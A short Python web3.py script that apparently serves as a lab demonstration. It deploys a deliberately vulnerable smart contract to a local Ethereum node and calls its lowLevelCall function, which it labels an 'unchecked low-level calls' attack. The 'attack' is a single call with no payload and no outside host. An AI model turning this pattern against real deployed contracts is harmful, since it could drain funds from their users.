from web3 import Web3
import json

# Configuration
NODE_URL = 'http://localhost:8545'
CONTRACT_PATH = 'UncheckedLowLevelCallsVulnerableContract.json'

def connect_to_ethereum(node_url):
    """Establish connection to the Ethereum node."""
    try:
        web3 = Web3(Web3.HTTPProvider(node_url))
        if web3.isConnected():
            print("Connected to Ethereum node.")
            return web3
        else:
            raise ConnectionError("Failed to connect to Ethereum node.")
    except Exception as e:
        print(f"Connection error: {e}")
        exit(1)

def load_contract_data(file_path):
    """Load ABI and bytecode from the specified JSON file."""
    try:
        with open(file_path, 'r') as file:
            data = json.load(file)
        return data['abi'], data['bytecode']
    except Exception as e:
        print(f"Error loading contract data: {e}")
        exit(1)

def deploy_contract(web3, abi, bytecode):
    """Deploy contract to the Ethereum network."""
    try:
        contract = web3.eth.contract(abi=abi, bytecode=bytecode)
        tx_hash = contract.constructor().transact()
        tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
        print(f"Contract deployed at address: {tx_receipt.contractAddress}")
        return web3.eth.contract(address=tx_receipt.contractAddress, abi=abi)
    except Exception as e:
        print(f"Contract deployment failed: {e}")
        exit(1)

def perform_unchecked_low_level_calls_attack(vulnerable_contract):
    """Execute attack exploiting unchecked low-level calls."""
    try:
        # Perform the attack
        tx_hash = vulnerable_contract.functions.lowLevelCall().transact()
        web3.eth.wait_for_transaction_receipt(tx_hash)
        print("Unchecked low-level call attack completed.")
    except Exception as e:
        print(f"Attack failed: {e}")

if __name__ == "__main__":
    # Setup
    web3 = connect_to_ethereum(NODE_URL)
    
    # Load vulnerable contract data
    vulnerable_abi, vulnerable_bytecode = load_contract_data(CONTRACT_PATH)
    
    # Deploy the vulnerable contract
    vulnerable_contract = deploy_contract(web3, vulnerable_abi, vulnerable_bytecode)
    
    # Execute the attack
    perform_unchecked_low_level_calls_attack(vulnerable_contract)
